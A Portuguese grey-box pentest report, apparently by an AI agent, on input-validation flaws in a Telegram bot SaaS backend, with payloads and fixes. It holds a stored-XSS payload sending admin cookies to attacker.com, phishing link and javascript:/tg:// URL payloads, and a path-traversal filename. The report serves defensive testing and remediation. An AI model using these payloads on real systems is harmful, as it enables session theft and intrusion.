# Relatório de Segurança de Aplicações (Pentest Caixa-Cinza)
**Projeto:** saas-telegram-bot
**Engenheiro Responsável:** Manus (Security Engineer)

Este relatório detalha as vulnerabilidades de validação de input identificadas no backend do SaaS e fornece payloads para validar essas falhas.

---

## 1. Cenários de Teste e Payloads

### Cenário A: Stored XSS no Painel Administrativo (Via Telegram)
*   **Endpoint:** Webhook do Telegram (`app/api/telegram/webhook/[storeId]/route.ts`)
*   **Função:** Registro automático de novos clientes ao interagir com o bot.
*   **Falha:** O `firstName` do usuário do Telegram é salvo no banco de dados (`customers.name`) e exibido no painel administrativo sem sanitização rigorosa.
*   **Payload:**
    ```html
    <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
    ```
    *(Nota: Altere seu nome no Telegram para este payload e interaja com o bot)*
*   **Comportamento:**
    *   **Vulnerável:** O script é executado no navegador do administrador ao visualizar a lista de clientes ou logs de atividade.
    *   **Seguro:** O script é exibido como texto puro ou removido/escapado pelo backend antes da renderização.

### Cenário B: HTML Injection / Quebra de Layout no Bot Telegram
*   **Endpoint:** Ação de Customização da Loja (`app/actions/settings.ts` -> `saveStoreCustomization`)
*   **Função:** Mensagem de boas-vindas do bot.
*   **Falha:** O campo `welcomeMessage` permite a inserção de tags HTML que, se mal formadas ou abusivas, podem quebrar o bot ou realizar phishing.
*   **Payload:**
    ```html
    👋 Bem-vindo! <a href="tg://settings">Clique aqui para ganhar um desconto!</a> (Phishing de Configurações)
    ```
    Ou para quebrar o processamento do Telegram:
    ```html
    <b>Mensagem não fechada
    ```
*   **Comportamento:**
    *   **Vulnerável:** O Telegram retorna erro `400 Bad Request` e o bot para de responder, ou renderiza links maliciosos que parecem legítimos.
    *   **Seguro:** O backend valida se o HTML é bem formado e se os links usam protocolos permitidos (http, https).

### Cenário C: Bypass de Protocolo e Open Redirect em Botões
*   **Endpoint:** Ação de Posts/Templates (`app/actions/tg-posts.ts`)
*   **Função:** Criação de botões inline com URLs.
*   **Falha:** O campo de URL dos botões não valida o protocolo, permitindo esquemas perigosos.
*   **Payload:**
    ```javascript
    javascript:alert('XSS_in_Web_Preview')
    ```
    Ou para esquemas internos:
    ```
    tg://proxy?server=127.0.0.1&port=8080
    ```
*   **Comportamento:**
    *   **Vulnerável:** O botão é criado e enviado. Dependendo do cliente Telegram, pode tentar executar ou redirecionar para esquemas locais/internos.
    *   **Seguro:** O backend rejeita qualquer URL que não comece com `http://` ou `https://`.

### Cenário D: Path Traversal em Metadados de Mídia (Teórico)
*   **Endpoint:** Upload de Mídia (`app/api/tg/upload/route.ts`)
*   **Função:** Upload de fotos/vídeos para o CDN.
*   **Falha:** Embora o arquivo vá para o Telegram, o nome do arquivo (`fileName`) é persistido no banco e usado em logs.
*   **Payload:**
    ```bash
    ../../../etc/passwd.png
    ```
*   **Comportamento:**
    *   **Vulnerável:** O sistema aceita o nome com caminhos relativos, o que pode causar problemas se esse nome for usado para gerar arquivos locais ou em visualizações de log mal protegidas.
    *   **Seguro:** O backend limpa o nome do arquivo, removendo caracteres de navegação de diretório.

---

## 2. Resumo de Comportamento Esperado

| Tipo de Falha | Comportamento Seguro (Backend) | Comportamento Vulnerável |
| :--- | :--- | :--- |
| **XSS Stored** | Sanitização via `DOMPurify` (no server) ou Escapamento HTML antes do Save. | Execução de JS no contexto do Admin ou do Bot. |
| **HTML Injection** | Validação de tags permitidas (`b`, `i`, `a`, `code`) e fechamento de tags. | Erro 400 no Telegram ou Phishing visual. |
| **URL Injection** | Whitelist de protocolos (`http:`, `https:`, `mailto:`). | Uso de `javascript:`, `data:`, `file:` ou esquemas `tg:`. |
| **Path Traversal** | Sanitização de strings para remover `..`, `/` e `\`. | Persistência de caminhos que podem ser explorados em outras funções. |

---

## Próximos Passos
Vou agora implementar as correções no código-fonte, focando em:
1. Criar um validador de URL robusto.
2. Adicionar sanitização de HTML para mensagens do Telegram.
3. Garantir que nomes de arquivos e nomes de usuários sejam limpos antes da persistência.
4. Realizar o Push das alterações para o repositório.
